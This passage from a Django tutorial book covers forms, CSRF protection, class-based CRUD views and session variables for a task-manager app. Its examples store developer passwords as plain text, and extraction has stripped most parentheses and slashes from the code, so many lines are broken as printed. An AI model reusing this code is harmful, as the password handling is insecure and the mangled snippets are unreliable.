else:       error=True     if not error:        We must get the supervisor       supervisor = Supervisor.objects.get id = supervisor_id        new_dev = Developer name=name, login=login, password=password,  supervisor=supervisor        new_dev.save         return HttpResponse "Developer added"      else:       return HttpResponse "An error has occured"    else:  supervisors_list = Supervisor.objects.all    return render request, 'en public create_developer.html',  'supervisors_list':supervisors_list}   [ 70 ]  Working with Django Forms   In this view, we haven't even checked whether the supervisor exists. Even if the code  is functional, note that it requires a lot of lines and we haven't verified the contents of  the transmitted data.  We used the HttpResponse   method so that we do not have to create   additional templates. We also have no details about client errors when a   field is entered incorrectly.   If you want to verify whether your code works properly, do not forget to check the  data in the administration module.  To try this form, you can add the following line in the block article_content of the  index.html file:   Create developer   Adding a developer with Django forms Django forms work with an object that inherits from the Form class. This object will  handle much of the work we have done manually in the previous example.  When displaying the form, it will generate the contents of the form template.   We may change the type of field that the object sends to the template if needed.   While receiving the data, the object will check the contents of each form element.   If there is an error, the object will send a clear error to the client. If there is no error,  we are certain that the form data is correct.  CSRF protection Cross-Site Request Forgery  CSRF  is an attack that targets a user who is loading   a page that contains a malicious request. The malicious script uses the authentication  of the victim to perform unwanted actions, such as changing data or access to  sensitive data.  The following steps are executed during a CSRF attack:  1.  Script injection by the attacker. 2.  An HTTP query is performed to get a web page. 3.  Downloading the web page that contains the malicious script.  [ 71 ]  Chapter 7   4.  Malicious script execution.  In this kind of attack, the hacker can also modify information that may be critical for  the users of the website. Therefore, it is important for a web developer to know how  to protect their site from this kind of attack, and Django will help with this.  To re-enable CSRF protection, we must edit the settings.py file and uncomment  the following line:  'django.middleware.csrf.CsrfViewMiddleware',  This protection ensures that the data that has been sent is really sent from a specific  property page. You can check this in two easy steps:  1.  When creating an HTML or Django form, we insert a CSRF token that will   store the server. When the form is sent, the CSRF token will be sent too.  2.  When the server receives the request from the client, it will check the CSRF   token. If it is valid, it validates the request.  Do not forget to add the CSRF token in all the forms of the site where protection is  enabled. HTML forms are also involved, and the one we have just made does not  include the token. For the previous form to work with CSRF protection, we need   to add the following line in the form of tags and    :  {% csrf_token %}  The view with a Django form We will first write the view that contains the form because the template will display  the form defined in the view. Django forms can be stored in other files as forms. py at the root of the project file. We include them directly in our view because the  form will only be used on this page. Depending on the project, you must choose  which architecture suits you best. We will create our view in the views create_ developer.py file with the following lines:  from django.shortcuts import render from django.http import HttpResponse  [ 72 ]  Working with Django Forms   from TasksManager.models import Supervisor, Developer from django import forms  This line imports the Django forms package class Form_inscription forms.Form :    This line creates the form with four fields. It is an object that  inherits from forms.Form. It contains attributes that define the form  fields.   name = forms.CharField label="Name", max_length=30    login      = forms.CharField label="Login", max_length=30    password   = forms.CharField label="Password", widget=forms. PasswordInput    supervisor = forms.ModelChoiceField label="Supervisor",  queryset=Supervisor.objects.all     View for create_developer def page request :   if request.POST:     form = Form_inscription request.POST       If the form has been posted, we create the variable that will  contain our form filled with data sent by POST form.     if form.is_valid  :      This line checks that the data sent by the user is consistent  with the field that has been defined in the form.       name          = form.cleaned_data['name']      This line is used to retrieve the value sent by the client. The  collected data is filtered by the clean   method that we will see  later. This way to recover data provides secure data.       login         = form.cleaned_data['login']       password      = form.cleaned_data['password']       supervisor    = form.cleaned_data['supervisor']         In this line, the supervisor variable is of the Supervisor  type, that is to say that the returned data by the cleaned_data  dictionary will directly be a model.       new_developer = Developer name=name, login=login,  password=password, email="", supervisor=supervisor        new_developer.save         return HttpResponse "Developer added"      else:       return render request, 'en public create_developer.html',  {'form' : form}         To send forms to the template, just send it like any other  variable. We send it in case the form is not valid in order to display  user errors:     else:     form = Form_inscription        In this case, the user does not yet display the form, it  instantiates with no data inside.     return render request, 'en public create_developer.html', {'form'  : form}   [ 73 ]  Chapter 7   This screenshot shows the display of the form with the display of an error message:  Template of a Django form We set the template for this view. The template will be much shorter:  {% extends "base.html" %} {% block title_html %}   Create Developer {% endblock %} {% block h1 %}   Create Developer {% endblock %} {% block article_content %}         {% csrf_token %}                    {{ form.as_table }}                         {% endblock %}  As the complete form operation is in the view, the template simply executes the   as_table   method to generate the HTML form.   The previous code displays data in tabular form. The three methods to generate   an HTML form structure are as follows:      as_table: This displays fields in the     tags    as_ul: This displays the form fields in the   tags     as_p: This displays the form fields in the   tags   [ 74 ]  Working with Django Forms   So, we quickly wrote a secure form with error handling and CSRF protection  through Django forms. In the Appendix, Cheatsheet, you can find the different   possible fields in a form.  The form based on a model ModelForms are Django forms based on models. The fields of these forms are  automatically generated from the model that we have defined. Indeed, developers  are often required to create forms with fields that correspond to those in the   database to a non-MVC website.   These particular forms have a save   method that will save the form data in   a new record.  The supervisor creation form To broach, we will take, for example, the addition of a supervisor.   For this, we will create a new page. For this, we will create the following URL:  url r'^create-supervisor$', 'TasksManager.views.create_supervisor. page', name="create_supervisor" ,  Our view will contain the following code:  from django.shortcuts import render from TasksManager.models import Supervisor from django import forms from django.http import HttpResponseRedirect from django.core.urlresolvers import reverse def page request :   if len request.POST  > 0:     form = Form_supervisor request.POST      if form.is_valid  :       form.save commit=True          If the form is valid, we store the data in a model record in  the form.       return HttpResponseRedirect reverse 'public_index'          This line is used to redirect to the specified URL. We use the  reverse   function to get the URL from its name defines urls.py.     else:       return render request, 'en public create_supervisor.html',  {'form': form}    else:     form = Form_supervisor       return render request, 'en public create_supervisor.html',  {'form': form}   [ 75 ]  Chapter 7   class Form_supervisor forms.ModelForm :   Here we create a class that inherits from ModelForm.   class Meta:    We extend the Meta class of the ModelForm. It is this class that  will allow us to define the properties of ModelForm.     model = Supervisor      We define the model that should be based on the form.     exclude =  'date_created', 'last_connexion',        We exclude certain fields of this form. It would also have been  possible to do the opposite. That is to say with the fields property,  we have defined the desired fields in the form.  As seen in the line exclude =  'date_created', 'last_connexion',  ,   it is possible to restrict the form fields. Both the exclude and fields properties   must be used correctly. Indeed, these properties receive a tuple of the fields to  exclude or include as arguments. They can be described as follows:     exclude: This is used in the case of an accessible form by the administrator.   Because, if you add a field in the model, it will be included in the form.    fields: This is used in cases in which the form is accessible to users.   Indeed, if we add a field in the model, it will not be visible to the user.  For example, we have a website selling royalty-free images with a registration form  based on ModelForm. The administrator adds a credit field in the extended model of  the user. If the developer has used an exclude property in some of the fields and did  not add credits, the user will be able to take as many credits as he she wants.  We will resume our previous template, where we will change the URL present in the  attribute action of the   tag:  {% url "create_supervisor" %}  This example shows us that ModelForms can save you a lot of time in development  by having a form that can be customized  by modifying the validation, for example .  In the next chapter, we will see how to be faster with the class-based views.  Advanced usage of Django forms We have studied the basics of the forms that allow you to create simple forms   with little customization. Sometimes, it is useful to customize aspects such as   data validation and error display, or use special graphics.  [ 76 ]  Working with Django Forms   Extending the validation form It is useful to perform specific validation of the form fields. Django makes this easy  while reminding you of the advantages of the forms. We will take the example of   the addition of a developer form, where we will conduct an audit of the password.   For this, we will change the form in our view  in the create_developer.py file  in  the following manner:  class Form_inscription forms.Form :   name       = forms.CharField label="Name", max_length=30    login = forms.CharField label = "Login"    password = forms.CharField label = "Password", widget = forms. PasswordInput     We add another field for the password. This field will be used  to avoid typos from the user. If both passwords do not match, the  validation will display an error message   password_bis = forms.CharField label = "Password", widget = forms. PasswordInput     supervisor = forms.ModelChoiceField label="Supervisor",  queryset=Supervisor.objects.all      def clean self :     This line allows us to extend the clean method that is responsible  for validating data fields.     cleaned_data = super  Form_inscription, self .clean        This method is very useful because it performs the clean    method of the superclass. Without this line we would be rewriting the  method instead of extending it.     password = self.cleaned_data.get 'password'        We get the value of the field password in the variable.     password_bis = self.cleaned_data.get 'password_bis'      if password and password_bis and password != password_bis:       raise forms.ValidationError "Passwords are not identical."          This line makes us raise an exception. This way, when the view  performs the is_valid   method, if the passwords are not identical,  the form is not validated .     return self.cleaned_data  With this example, we can see that Django is very flexible in the management of  forms and audits. It also allows you to customize the display of errors.  [ 77 ]  Chapter 7   Customizing the display of errors Sometimes, it may be important to display user-specific error messages. For example,  a company may request for a password that must contain certain types of characters;  for example, the password must contain at least one number and many letters. In such  cases, it would be preferable to also indicate this in the error message. Indeed, users  read more carefully the error messages than help messages.  To do this, you must use the error_messages property in the form fields and set the  error message as a text string.  It is also possible to define different messages depending on the type of error. We  will create a dictionary of the two most common mistakes and give them a message.  We can define this dictionary as follows:  error_name = {   'required': 'You must type a name !',   'invalid': 'Wrong format.' }  We will modify the name field of the Form_inscription form of create_ developer.py:   name = forms.CharField label="Name", max_length=30, error_ messages=error_name   This way, if the user doesn't fill the name field, he she will see the following  message: You must type a name!. To apply this message to ModelForm, we have to go to the models.py file and  modify the line that contains the name field.   name = models.CharField max_length=50, verbose_name="Name", error_ messages=error_name   When editing models.py, we should not forget to specify the error_name dictionary.   These error messages improve the quality of the website by informing the user of  his her mistakes. It is very important to use custom errors on fields when validation  is complex. However, do not overdo it on the basic fields as this would be a waste of  time for the developer.  Using widgets Widgets are an effective way to customize the display of the form elements. Indeed,  in some cases, it may be helpful to specify a text area field with particular dimensions  in ModelForm.  [ 78 ]  Working with Django Forms   To learn the practice of using widgets and continue the development of our  application, we will create the page of the creation of projects. This page will contain  a Django form, and we'll set the description field in the HTML   tag.  We need to add the following URL to the urls.py file:  url r'^create_project$', ' TasksManager.views.create_project.page',  name='create_project' ,  Then, create our view in the create_project.py file with the following code:   from django.shortcuts import render from TasksManager.models import Project from django import forms from django.http import HttpResponseRedirect from django.core.urlresolvers import reverse class Form_project_create forms.Form :   title = forms.CharField label="Title", max_length=30    description = forms.CharField widget= forms.Textarea attrs={'rows':  5, 'cols': 100,}     client_name = forms.CharField label="Client", max_length=50  def page request :   if request.POST:     form = Form_project_create request.POST      if form.is_valid  :        title = form.cleaned_data['title']        description = form.cleaned_data['description']       client_name = form.cleaned_data['client_name']       new_project = Project title=title, description=description,  client_name=client_name        new_project.save         return HttpResponseRedirect reverse 'public_index'        else:       return render request, 'en public create_project.html', {'form'  : form}     else:     form = Form_project_create      return render request, 'en public create_project.html', {'form' :  form}   It is possible to take one of the templates that we have created and adapted. This  form will work the same way as all the Django forms that we have created. After  copying a template that we have already created, we only need to change the title  and URL of the action property of the   tag. By visiting the page, we notice  that the widget works well and displays a text area more suitable for long text.  [ 79 ]  Chapter 7   There are many other widgets to customize forms. A great quality of Django is that it  is generic and totally adaptable with time.  Setting initial data in a form There are two ways to declare the initial value of form fields with Django.   The following examples take place in the create_developer.py file.  When instantiating the form The following code will display new in the name field and will select the first  supervisor in the   field that defines the supervisor. These fields are   editable by the user:  form = Form_inscription initial={'name': 'new', 'supervisor':  Supervisor.objects.all  [:1].get  .id}   This line must replace the following line in the create_developer.py view:  form = Form_inscription    When defining fields To get the same effect as in the previous section, display new in the name field and  select the first supervisor in the corresponding field; you must change the declaration  name and supervisor fields with the following code:  name = forms.CharField label="Name", max_length=30, initial="new"  supervisor = forms.ModelChoiceField label="Supervisor",  queryset=Supervisor.objects.all  , initial=Supervisor.objects.all   [:1].get  .id   Summary In this chapter, we learned how to use Django forms. These forms allow you to save  a lot of time with automatic data validation and error display.  In the next chapter, we will go further into the generic actions and save even more  time with the forms.  [ 80 ]  Working with Django Forms   Raising Your Productivity   with CBV  Class-based views  CBVs  are views generated from models. In simple terms,   we can say that these are like ModelForms, in that they simplify the view and   work for common cases.  CRUD is the short form we use when referring to the four major operations  performed on a database: create, read, update, and delete. CBV is the best way   to create pages that perform these actions very quickly.  Creating forms for creating and editing a model or database table data is a very  repetitive part of the job of a developer. They may spend a lot of time in doing  this properly  validation, prefilled fields, and so on . With CBV, Django allows a  developer to perform CRUD operations for a model in less than 10 minutes. They  also have an important advantage: if the model evolves and CBVs were well done,  changing the model will automatically change the CRUD operations within the  website. In this case, adding a line in our models allows us to save tens or hundreds  of lines of code.  CBVs still have a drawback. They are not very easy to customize with advanced  features or those that are not provided. In many cases, when you try to perform   a CRUD operation that has some peculiarities, it is better to create a new view.  You might ask why we did not directly study them—we could have saved a lot  of time, especially when adding a developer in the database. This is because these  views are generic. They are suitable for simple operations that do not require a lot  of changes. When we need a complex form, CBVs will not be useful and will even  extend the duration of programming.  We should use CBVs because they allow us to save a lot of time that would normally  be used in running CRUD operations on models.   In this chapter, we will make the most of our TasksManager application. Indeed, we  will enjoy the time savings offered by the CBVs to move quickly with this project. If  you do not understand the functioning of CBVs immediately, it doesn't matter. What  we have seen so far in previous chapters already allows us to make websites.  In this chapter, we will try to improve our productivity by covering the   following topics:     We will use the CreateView CBV to quickly build the page to add projects    We will see later how to display a list of objects and use the paging system    We will then use the DetailView CBV to display the project information    We will then learn how to change the data in a record with the UpdateView   CBV     We will learn how to change the form generated by a CBV    We will then create a page to delete a record    Then, we will eventually create a child class of UpdateView to make using    it more flexible in our application  The CreateView CBV The CreateView CBV allows you to create a view that will automatically generate  a form based on a model and automatically save the data in this form. It can be  compared to ModelForm, except that we do not need to create a view. Indeed,   all the code for this will be placed in the urls.py file except in special cases.  An example of minimalist usage We will create a CBV that will allow us to create a project. This example aims to  show that you can save even more time than with Django forms. We will be able  to use the template used for the creation of forms in the previous chapter's project.  Now, we will change our create_project URL as follows:  url  r'^create_project$', CreateView.as_view model=Project, template_ name="en public create_project.html", success_url = 'index' ,  name="create_project" ,  We will add the following lines at the beginning of the urls.py file:  from django.views.generic import CreateView from TasksManager.models import Project  [ 82 ]  Raising Your Productivity with CBV   In our new URL, we used the following new features:     CreateView.as_view: We call the method as_view of the CBV CreateView.   This method returns a complete view to the user. Moreover, we return  multiple parameters in this method.      model: This defines the model that will apply the CBV.    template_name: This defines the template that will display the form. As   the CBV uses ModelForm, we do not need to change our create_project. html template.     success_url: This defines the URL to which we will be redirected once the  change has been taken into account. This parameter is not very DRY because  we cannot use the name property of the URL. When we extend our CBV, we  will see how to use the name of the URL to be redirected.  That's all! The three lines that we have added to the urls.py file will perform the  following actions:     Generate the form    Generate the view that sends the form to the template with or without errors    Data is sent by the user  We just used one of the most interesting features of Django. Indeed, with only three  lines, we have been doing what would have taken more than a hundred lines without  any framework. We will also write the CBV that will allow us to add a task. Have a  look at the following code:  from TasksManager.models import Project, Task url  r'^create_task$', CreateView.as_view model=Task, template_ name="en public create_task.html", success_url = 'index' ,  name="create_task" ,  We then need to duplicate the create_project.html template and change the link in  the base.html template. Our new view is functional, and we used the same template  for project creation. This is a common method because it saves a lot of time for the  developer, but there is a more rigorous way to proceed.  To test the code, we can add the following link to the end of the article_content  block of the index.html template:   Create task   [ 83 ]  Chapter 8   Working with ListView ListView is a CBV that displays a list of records for a given model. The view is  generated to send a template object from which we view the list.  An example of minimalist usage We will look at an example displaying the list of projects and create a link to the  details of a project. To do this, we must add the following lines in the urls.py file:  from TasksManager.models import Project from django.views.generic.list import ListView  Add the following URLs to the file:  url  r'^project_list$', ListView.as_view model=Project, template_ name="en public project_list.html" , name="project_list" ,  We will create the template that will be used to display the results in a tabular form  by adding the following lines in the article_content block after extending the  base.html template:         Title     Description     Client name    {% for project in object_list %}          {{ project.title }}       {{ project.description }}       {{ project.client_name }}      {% endfor %}    [ 84 ]  We created the same list as in Chapter 6, Getting a Model's Data with Querysets, about  the queryset. The advantage is that we used a lot less lines and we did not use any  view to create it. In the next part, we will implement paging by extending this CBV.  Raising Your Productivity with CBV   Extending ListView It is possible to extend the possibilities of the ListView CBV and customize them.  This allows us to adapt the CBV to the needs of the websites. We can define the same  elements as in the parameters in the as_view method, but it will be more readable  and we can also override the methods. Depending on the type of CBV, spreading  them allows you to:     Change the model and template as we did in the URL    Change the queryset to be executed    Change the name of the object sent to the template    Specify the URL that will redirect the user  We will expand our first CBV by modifying the list of projects that we have done.  We will make two changes to this list by sorting by title and adding pagination. We  will create the ListView.py file in the views cbv module. This file will contain our  customized listView. It is also possible to choose the architecture. For example,   we could create a file named project.py to store all the CBVs concerning the  projects. This file will contain the following code:  from django.views.generic.list import ListView   In this line, we import the ListView class from TasksManager.models import Project  class Project_list ListView :   In this line, we create a class that extends the ListView class.   model=Project   template_name = 'en public project_list.html'   In this line, we define the template_name the same manner as in the  urls.py file.   paginate_by = 5  In this line, we define the number of visible projects on a single  page.   def get_queryset self :  In this line, we override the get_queryset   method to return our  queryset.     queryset=Project.objects.all  .order_by "title"      return queryset  We could also have set the queryset in the following manner:  queryset=Project.objects.all  .order_by "title"   [ 85 ]  Chapter 8   However, it may be useful to create a class that can be adapted to many cases. For the  Project_list class to be interpreted in the URLs, we need to change our imports by  adding the following line:   from TasksManager.views.cbv.ListView import Project_list  You must then change the URL. In this urls.py file, we will use the Project_list  object without any parameters, as shown in the following code snippet; they are all  defined in the ListView.py file:  url  r'^project_list$', Project_list.as_view  , name="project_list" ,  From now on, the new page is functional. If we test it, we will realize that only the  first five projects are displayed. Indeed, in the Project_list object, we defined a  pagination of five items per page. To navigate through the list, we need to add the  following code in the template before the end of the article_content block:  {% if is_paginated %}               {% if page_obj.has_previous %}       <a href="{% url "project_list" %}?page={{ page_obj.previous_ page_number }}">Previous      {% endif %}             Page {{ page_obj.number }} of {{ page_obj.paginator.num_pages  }}.           {% if page_obj.has_next %}       <a href="{% url "project_list" %}?page={{ page_obj.next_page_ number }}">Next      {% endif %}           {% endif %}  This part of the template allows us to create links to the preceding and following pages  at the bottom of the page. With this example, we created a sorted list of projects with  pagination very quickly. The extending of CBVs can be very convenient and allows us  to adapt to more complex uses. After this complete example, we will create a CBV to  display a list of developers. This list will be useful later in the book. We must add the  following URL after importing the ListView class:  url  r'^developer_list$', ListView.as_view model=Developer, template_ name="en public developer_list.html" , name="developer_list" ,  [ 86 ]  Raising Your Productivity with CBV   We then use an inherited template of base.html and put the following code in the  article_content block:             Name       Login       Supervisor        {% for dev in object_list %}               {{ dev.name }}          {{ dev.login }}         {{ dev.supervisor }}          {% endfor %}    We will notice that the name of the developer is an empty link. You should refill it  when we create the page that displays the details of the developer. This is what we  will do in the next section with DetailView.  The DetailView CBV The DetailView CBV allows us to display information from a registration model.  This is the first CBV we will study that has URL parameters. In order to view the  details of a record, it will send its ID to the CBV. We will study some examples.  An example of minimalist usage First, we will create a page that will display the details of a task. For this, we will  create the URL by adding these lines in the urls.py file:  from django.views.generic import DetailView from TasksManager.models import Task url  r'^task_detail_ ?P \d+ $', DetailView.as_view model=Task,  template_name="en public task_detail.html" , name="task_detail" ,  In this URL, we added the parameter-sending aspect. We have already discussed this  type of URL in an earlier chapter when we covered querysets.  This time, we really need to name the parameter pk; otherwise, the CBV  will not work. pk means primary key, and it will contain the ID of the  record you want to view.  [ 87 ]  Chapter 8   Regarding the template, we will create the en public task_detail.html template  and place the following code in the article_content block:      {{ object.title }}              Project : {{ object.project }}       Developer : {{ object.app_user }}               Importence : {{ object.importence }}       Time elapsed : {{ object.time_elapsed }}            {{ object.description }}    In this code, we refer to the foreign keys Developer and Project. Using this syntax  in the template, we call the __ unicode__   of the model in question. This enables  the title of the project to be displayed. To test this piece of code, we need to create a  link to a parameterized URL. Add this line to your index.html file:   Detail first view    This line will allow us to see the details of the first task. You can try to create a list of  tasks and a link to DetailView in each row of the table. This is what we will do.  Extending DetailView We will now create the page that displays the details of a developer and his her  tasks. To get it done, we'll override the DetailView class by creating a DetailView. py file in the views cbv module and add the following lines of code:  from django.views.generic import DetailView from TasksManager.models import Developer, Task  class Developer_detail DetailView :    model=Developer   template_name = 'en public developer_detail.html'   def get_context_data self, **kwargs :      This overrides the get_context_data   method.     context = super Developer_detail, self .get_context_data **kwargs    [ 88 ]  Raising Your Productivity with CBV        This allows calling the method of the super class. Without this  line we would not have the basic context.     tasks_dev = Task.objects.filter developer = self.object        This allows us to retrieve the list of developer tasks. We use  self.object, which is a Developer type object already defined by the  DetailView class.     context['tasks_dev'] = tasks_dev       In this line, we add the task list to the context.     return context  We need to add the following lines of code to the urls.py file:  from TasksManager.views.cbv.DetailView import Developer_detail  url  r'^developer_detail_ ?P \d+ $', Developer_detail.as_view  ,  name="developer_detail" ,  To see the main data and develop tasks, we create the developer_detail.html  template. After extending from base.html, we must enter the following lines in the  article_content block:      {{ object.name }}    Login : {{ object.login }}    Email : {{ object.email }}   Tasks      {% for task in tasks_dev %}          {{ task.title }}       {{ task.importence }}       {{ task.project }}        {% endfor %}    This example has allowed us to see how to send data to the template while   using CBVs.  [ 89 ]  Chapter 8   The UpdateView CBV UpdateView is the CBV that will create and edit forms easily. This is the CBV that saves  more time compared to developing without the MVC pattern. As with DetailView,  we will have to send the logins of the record to the URL. To address UpdateView,   we will discuss two examples:     Changing a task for the supervisor to be able to edit a task    Reducing the time spent to perform a task to develop  An example of minimalist usage This example will show how to create the page that will allow the supervisor   to modify a task. As with other CBVs, we will add the following lines in the   urls.py file:  from django.views.generic import UpdateView url  r'^update_task_ ?P \d+ $', UpdateView.as_view model=Task,  template_name="en public update_task.html", success_url="index" ,  name="update_task" ,  We will write a very similar template to the one we used for CreateView. The only  difference  except the button text  will be the action field of the form, which we   will define as empty. We will see how to fill the field at the end of this chapter. For  now, we will make use of the fact that browsers submit the form to the current page  when the field is empty. It remains visible so users can write the content to include   in our article_content block. Have a look at the following code:      {% csrf_token %}          {{ form.as_table }}               This example is really simple. It could have been more DRY if we entered the name  of the URL in the success_url property.  Extending the UpdateView CBV In our application, the life cycle of a task is the following:     The supervisor creates the task without any duration    When the developer has completed the task, they save their working time  [ 90 ]  Raising Your Productivity with CBV   We will work on the latter point, where the developer can only change the duration  of the task. In this example, we will override the UpdateView class. To do this, we  will create an UpdateView.py file in the views cbv module. We need to add the  following content:  from django.views.generic import UpdateView from TasksManager.models import Task from django.forms import ModelForm from django.core.urlresolvers import reverse  class Form_task_time ModelForm :   In this line, we create a form that extends the ModelForm. The  UpdateView and CreateView CBV are based on a ModelForm system.   class Meta:     model = Task     fields = ['time_elapsed']       This is used to define the fields that appear in the form. Here  there will be only one field.  class Task_update_time UpdateView :   model = Task   template_name = 'en public update_task_developer.html' form_class = Form_task_time   In this line, we impose your CBV to use the ModelForm we created.  When you do not define this line, Django automatically generates a  ModelForm.   success_url = 'public_empty'     This line sets the name of the URL that will be seen once the  change has been completed.   def get_success_url self :     In this line, when you put the name of a URL in the success_url  property, we have to override this method. The reverse   method  returns the URL corresponding to a URL name.     return reverse self.success_url   We may use this CBV with the following URL:  from TasksManager.views.cbv.UpdateView import Task_update_time  url  r'^update_task_time_ ?P \d+ $', Task_update_time.as_view  ,  name = "update_task_time" ,  For the update_task_developer.html template, we just need to duplicate the  update_task.html template and modify its titles.  [ 91 ]  Chapter 8   The DeleteView CBV The DeleteView CBV can easily delete a record. It does not save a lot of time  compared to a normal view, but it cannot be burdened with unnecessary views.   We will show an example of task deletion. For this, we need to create the  DeleteView.py file in the views cbv module. Indeed, we need to override   it because we will enter the name of the URL that we want to redirect. We can   only put the URL in success_url, but we want our URL to be as DRY as possible.  We will add the following code in the DeleteView.py file:  from django.core.urlresolvers import reverse from django.views.generic import DeleteView from TasksManager.models import Task  class Task_delete DeleteView :   model = Task   template_name = 'en public confirm_delete_task.html'   success_url = 'public_empty'   def get_success_url self :     return reverse self.success_url   In the preceding code, the template will be used to confirm the deletion. Indeed,   the DeleteView CBV will ask for user confirmation before deleting. We will add   the following lines in the urls.py file to add the URL of the deletion:  from TasksManager.views.cbv.DeleteView import Task_delete url r'task_delete_ ?P \d+ $', Task_delete.as_view  , name="task_ delete" ,  To finish our task suppression page, we will create the confirm_delete_task. html template by extending base.html with the following content in the article_ content block:   Do you want to delete this object?      {% csrf_token %}          {{ form.as_table }}               [ 92 ]  Raising Your Productivity with CBV   Going further by extending the CBV CBVs allow us to save a lot of time during page creation by performing CRUD  actions with our models. By extending them, it is possible to adapt them to our use  and save even more time.  Using a custom class CBV update To finish our suppression page, in this chapter, we have seen that CBVs allow us to  not be burdened with unnecessary views. However, we have created many templates  that are similar, and we override the CBV only to use the DRY URLs. We will fix these  small imperfections. In this section, we will create a CBV and generic template that will  allow us to:      Use this CBV directly in the urls.py file    Enter the name property URLs for redirection    Benefit from a template for all uses of these CBVs  Before writing our CBV, we will modify the models.py file, giving each model   a verbose_name property and verbose_name_plural. For this, we will use the   Meta class. For example, the Task model will become the following:  class Task models.Model :    fields   def __str__ self :     return self.title   class Meta:     verbose_name = "task"     verbose_name_plural = "tasks"   We will create an UpdateViewCustom.py file in the views cbv folder and add the  following code:  from django.views.generic import UpdateView from django.core.urlresolvers import reverse  class UpdateViewCustom UpdateView :   template_name = 'en cbv UpdateViewCustom.html'     In this line, we define the template that will be used for all the  CBVs that extend the UpdateViewCustom class. This template_name field  can still be changed if we need it.   url_name=""     This line is used to create the url_name property. This property  will help us to define the name of the current URL. In this way, we  can add the link in the action attribute of the form.  [ 93 ]  Chapter 8     def get_success_url self :    In this line, we override the get_success_url   method by default,  this method uses the name URLs.     return reverse self.success_url    def get_context_data self, **kwargs :     This line is the method we use to send data to the template.     context = super UpdateViewCustom, self .get_context_data **kwargs        In this line, we perform the super class method to send normal  data from the CBV UpdateView.     model_name = self.model._meta.verbose_name.title         In this line, we get the verbose_name property of the defined  model.     context['model_name'] = model_name       In this line, we send the verbose_name property to the template.     context['url_name'] = self.url_name \      This line allows us to send the name of our URL to the template.     return context  We then need to create the template that displays the form. For this, we need to  create the UpdateViewCustom.html file and add the following content:  {% extends "base.html" %} {% block title_html %}   Update a {{ model_name }}    <!-- In this line, we show the type of model we want to change here.  --> {% endblock %} {% block h1 %}   Update a {{ model_name }}  {% endblock %} {% block article_content %}     <!-- line  2 -->   <!-- In this line, we use our url_name property to redirect the form  to the current page. -->     {% csrf_token %}              {{ form.as_table }}                    {% endblock %}  To test these new CBVs, we will change the update_task URL in the   following manner:  [ 94 ]  Raising Your Productivity with CBV   url  r'^update_task_ ?P \d+ $', UpdateViewCustom.as_ view model=Task, url_name="update_task", success_url="public_empty" ,  name="update_task" ,  The following is a screenshot that shows what the CBV will display:  Summary In this chapter, we have learned how to use one of the most powerful features of   Django: CBVs. With them, developers can run efficient CRUD operations.  We also learned how to change CBVs to suit our use by adding pagination on a list of  items or displaying the work of a developer on the page that displays the information  for this user.  In the next chapter, we will learn how to use session variables. We will explore this  with a practical example. In this example, we will modify the task list to show the  last task accessed.  [ 95 ]  Chapter 8    Using Sessions  Sessions are variables stored by the server according to the user. On many websites,  it is useful to keep user data as an identifier, a basket, or a configuration item. For  this, Django stores this information in the database. It then randomly generates  a string as a hash code that is transmitted to the client as a cookie. This way of  working allows you to store a lot of information about the user while minimizing the  exchange of data between the server and client, for example, the type of identifier  that the server can generate.  In this chapter, we will do the following:     Study how session variables work with the Django framework    Learn how to create and retrieve a session variable    Study session variables with a practical and useful example    Make ourselves aware of the safety of using session variables  Firebug is a plugin for Firefox. This is a handy tool for a web developer; it allows you  to do the following:     Display the JavaScript console to read errors    Read and edit the HTML code of the page from the browser    View the cookies used by the website consulted  Cookies realized with Firebug   In this screenshot realized with Firebug, we notice that we have two cookies:     sessionid: This is our session ID. It is with this identifier that Django will   know with which user it processes.     csrftoken: This cookie is typical Django. We already spoke about it in the   chapter about forms. It won't be used in this chapter.  The following is a screenshot of the table where session data is stored:  Sessions are very useful, especially for authentication systems. Indeed, in many cases,  when a user connects to a website, we record their identifier in the session variable.  Thus, with each HTTP request, the user sends this identifier to inform the site about  their status. This is also an essential system to make the administration module work,  which we will see in a later chapter. However, sessions have a disadvantage if they are  not regularly removed: they take more space in the database. To use sessions in Django,  the django.contrib.sessions.middleware.SessionMiddleware middleware must  be enabled and the browser must accept cookies.  The life cycle of a session is explained as follows:  1.  The user who does not have any session makes an HTTP request to    the website.  2.  The server generates a session identifier and sends it to the browser along   with the page requested by the user.  3.  Whenever the browser makes a request, it will automatically send the    session identifier.  4.  Depending on the configuration of the system administrator, the server   periodically checks if there are expired sessions. If this is the case, it may   be deleted.  [ 98 ]  Using Sessions   Creating and getting session variables With Django, storage in a database, generation of the hash code, and exchanges   with the client will be transparent. Sessions are stored in the context represented  by the request variable. To save a value in a session variable, we must use the  following syntax:  request.session['session_var_name'] = "Value"  Once the session variable is registered, you must use the following syntax to recover it:  request.session['session_var_name']  To use these lines, we have to be sure to interact with the request context. Indeed, in  some cases, such as CBV, we do not have simple access to the request context.  An example – showing the last task consulted In this example, we will show a practical example of using session variables. In  general, a developer consults the tasks to be done. He she selects one task, studies it,   and then realizes and notes the time spent. We will store the identifier of the last   task accessed in a session variable, and we will display it at the top of the tasks list   to be carried out.  For this, we will no longer use the DetailView CBV to display the details of a task,  but we will use a real view. First, we must define the URL that will allow us to see  our view. For this, we will modify the task_detail URL with the following code:  url  r'^task_detail_ ?P \d+ $', 'TasksManager.views.task_detail. page', name="task_detail" ,  We will create our view in the views task_detail.py file with the following code:   from django.shortcuts import render from TasksManager.models import Task from django.http import HttpResponseRedirect from django.core.urlresolvers import reverse def page request, pk :   check_task = Task.objects.filter id = pk      This line is used to retrieve a queryset of the elements whose ID  property matches to the parameter pk sent to the URL. We will use this  queryset in the following line : task = check_task.get  .      try:    This is used to define an error handling exception to the next  line.     task = check_task.get    [ 99 ]  Chapter 9        This line is used to retrieve the record in the queryset.   except  Task.DoesNotExist, Task.MultipleObjectsReturned :    This allows to process the two kind of exceptions: DoesNotExist  and MultipleObjectsReturned. The DoesNotExist exception type is raised  if the queryset has no records. The MultipleObjectsReturned exception  type is raised if queryset contains multiple records.     return HttpResponseRedirect reverse 'public_empty'        This line redirects the user if an exception is thrown. We could  also redirect to an error page.   else:     request.session['last_task'] = task.id      This line records the ID property of the task in a session  variable named last_task.     In this line, we use the same template that defines the form CBV  DetailView. Without having to modify the template, we send our task in  a variable named object.   return render request, 'en public task_detail.html', {'object' :  task}   We will then create a list of the tasks with the ListView CBV. To do this, we must  add the following URL to the urls.py file:  url  r'^task_list$', 'TasksManager.views.task_list.page', name="task_ list" ,  The corresponding view for this URL is as follows:  from django.shortcuts import render from TasksManager.models import Task from django.core.urlresolvers import reverse def page request :   tasks_list = Task.objects.all       This line is used to 